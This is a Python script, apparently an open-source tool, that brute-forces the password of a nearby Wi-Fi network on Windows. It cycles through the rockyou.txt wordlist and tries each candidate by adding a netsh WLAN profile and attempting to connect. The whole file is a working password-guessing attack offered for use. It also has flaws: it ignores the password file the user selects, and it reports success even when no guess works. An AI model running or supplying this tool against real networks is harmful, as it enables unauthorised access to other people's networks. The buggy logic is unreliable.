from subprocess import getoutput,run,DEVNULL,PIPE,check_output
from os import makedirs,_exit,path
from tempfile import NamedTemporaryFile
from xdialog import open_file
from sys import argv,platform
from time import sleep,perf_counter
from re import search,MULTILINE
from webbrowser import open_new
from keyring import get_credential,set_password

CUSTOMROCKYOU=False
DEBUG=False
print('tromosm/wifi_bruteforce - v1.0\n')

if not get_credential('tromosm_opensource','wifi_bruteforce'):
    print("You may not use the Service for any illegal purpose, for the facilitation of the violation of any law or regulation, or in any manner inconsistent with these Terms.\n")
    set_password('tromosm_opensource','wifi_bruteforce','none')
if not platform.startswith('win'):
    print('This script is developed for Windows and might not work on your operating system')
    c=input('continue anyway? (y/N) : ')
    if not c.lower().startswith('y'):
        _exit(0)

if len(argv)>1:
    for arg in argv[1:]:
        org=arg
        arg=arg.lower().replace('-','').replace('_','').replace(' ','')
        if arg=='debug':
            DEBUG=True
        elif arg.startswith('file='):
            _,rpath=org.split('=',1)
            if path.exists(rpath):
                CUSTOMROCKYOU=rpath
            else:
                print(f'"{path}" does not exist')
        elif arg in ('download','rockyou','passfile','passwordfile','downloadfile','downloadpasswordfile'):
             open_new('https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt')
        elif arg in ('support','open','github','opensupport','source','sourcefiles'):
            open_new('https://github.com/tromosm/wifi_bruteforce/')
        elif arg in ('h','help','what','?'):
            print("""
tromosm/wifi_bruteforce : a simple python script to guess the chosen network's password from a password file(eg: rockyou.txt) powered by netsh for windows.

for support and issues visit https://github.com/tromosm/wifi_bruteforce/
developer : https://tromosm.gt.tc | tromosm7@gmail.com
==========================================================================
------------------------
    ARGS (--,-,a/A)      
------------------------

debug : turn on debug mode | example: main.py -debug\n
file={passwordfilepath} : provided file path will be used and no "open password file" prompt will be shown. path can be relative or absolute. however if the provided path does not exist the "open password file" will be shown | example: main.py file="rockyou.txt"\n
help | h | what | ? : this will show the help text. which you're currently looking at | example main.py -help\n
download | rockyou | passfile | passwordfile : downloads a common password file from github | example main.py -passfile
support | github | opensupport | source : opens the github page 
""")
            input('')
            _exit(0)

PASSWORDFILE=CUSTOMROCKYOU
if not CUSTOMROCKYOU:
    havepass=input('Do you have a password file (y/N) : ')
    if not havepass.lower().startswith('y'):
        print('A text file will be downloaded to your Downloads/ folder (default download folder selected in your default browser)')
        open_new('https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt')
        input('When the file is downloaded hit enter ')
    while True:
        passwfile=open_file('open password file',[('txt file','*.txt')],False)
        if passwfile!='':
            print(f'password file selected : {path.basename(passwfile)}')
            break
        else:
            print(f'file not found : {passwfile}')
else:
    print(f'>> password file selected : "{PASSWORDFILE}"')
#by @JonathanDavidArndt on https://superuser.com/users/243707/jonathandavidarndt
def createProfile(ssid,password):
    return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
    </MacRandomization>
</WLANProfile>"""


def getavailable():
    networks=getoutput(f'netsh wlan show networks')
    findlist=[]
    for line in networks.splitlines():
        if 'SSID' in line:
            info=line.split(':')
            findlist.append(info[1].strip())
            # print(f'{info[0]} : {info[1]}')
    return findlist


def getCurrent(what='SSID'):
    current=check_output('netsh wlan show interfaces',stderr=PIPE,universal_newlines=True)
    if what=='SSID':
        out=search(r'^\s*SSID\s*:\s*(.+)$',current,MULTILINE)
    elif what=='State':
        out=search(r'^\s*State\s*:\s*(.+)$',current,MULTILINE)
    return {
        ".":current,
        "out":out
    }

whichssid=0
found=getavailable()
print(f'Choose a network to search.\n{"Cant find your network? click the wifi icon in the taskbar and try this again\n" if len(found)<2 else ""}')
for ssid in found:
    whichssid+=1
    print(f'[{whichssid}] {ssid}')

lastrejectReason='none'
slepttime=0

def connect(SSID,PASSWORD):
    global lastrejectReason,slepttime
    slepttime=0
    if DEBUG:
        print(f'{SSID} : {PASSWORD}')
    makedirs('./temp/profiles/',exist_ok=True)
    with NamedTemporaryFile(mode='w',suffix='.xml',delete=False) as temp:
        temp.write(createProfile(SSID,PASSWORD))
    filename=temp.name
    added=run(f'netsh wlan add profile filename="{filename}"',capture_output=True,text=True)#,stderr=DEVNULL,stdout=DEVNULL)
    if "is added on interface Wi-Fi." in added.stdout:
        # print(added.stdout)
        connected=run(f'netsh wlan connect name="{SSID}"',capture_output=True,text=True)#,stderr=DEVNULL,stdout=DEVNULL)
        if "Connection request was completed successfully." in connected.stdout:  
            sleep(4)
            slepttime+=4
            current=getCurrent('SSID')
            if 'disconnecting' in current.get('.'):
                sleep(3)
                slepttime+=3
            if 'disconnected' in current.get('.'):
                lastrejectReason='isnt connect to any network'
                return False 
            ssid=getCurrent('SSID').get('out')
            if ssid:
                if ssid.group(1).strip()==SSID:
                    ssid=getCurrent('State').get('out')
                    if ssid and ssid.group(1)=='connected':
                        return True
                    elif ssid and ssid.group(1)=='authenticating':
                        sleep(3)
                        slepttime+=3
                        ssid=getCurrent('State').get('out')
                        if ssid and ssid.group(1)=='connected':
                            return True
                        else:
                            lastrejectReason=f'current state isnt connected its {ssid.group(1) or current} while it was previously authenticating'
                            return False 

                    else:
                        lastrejectReason=f'current state isnt connected its {ssid.group(1) or current} chars({len(str(ssid.group(1))) if ssid else "None"})'
                        return False
                else:
                    lastrejectReason=f'current ssid isnt {SSID} its {ssid.group(1).strip()}'
                    return False
            else:
                lastrejectReason=f'cant find ssid in netsh : {current}'
                return False
            # print(connected.stdout)
        else:
            lastrejectReason='connection request did not complete successfully'
            return False
    else:
        lastrejectReason='profile was not added to netsh'
        return False


networkin=input(f'Choose network [1->{whichssid}] : ')
networkin=int(networkin)
selected=found[networkin-1]
if selected:
  allpassw=0
  with open('rockyou.txt','rb') as passwordfile:
    allpassw=sum(1 for line in passwordfile)
  startbruteforce=perf_counter()
  with open('rockyou.txt','r',encoding='utf-8') as passwordfile:
    # passwords=passwordfile.read().splitlines()  memoryoverflow yo
    if networkin==0:
        pass
    else:
        tries=0
        for password in passwordfile:
            if tries==0:
                pass
            tries+=1
            if not DEBUG:
                print(f'brute forcing network : ({tries}/{allpassw})'.ljust(30+(len(str(allpassw)*2))),sep='',end="\r",flush=True)
            else:
                print(lastrejectReason)
            connected=connect(selected,password.strip())
            if connected:
                print(''.ljust(30+(len(str(allpassw)*2))),sep='',end='\r',flush=True)
                print(f'Successfully connected to {selected}. Password was "{password}"')
                break
            elif DEBUG:
                print('fail')
        finishbruteforce=perf_counter()
        print(f'Password found in {tries}/{allpassw} tries and took {(finishbruteforce-startbruteforce):2f}s')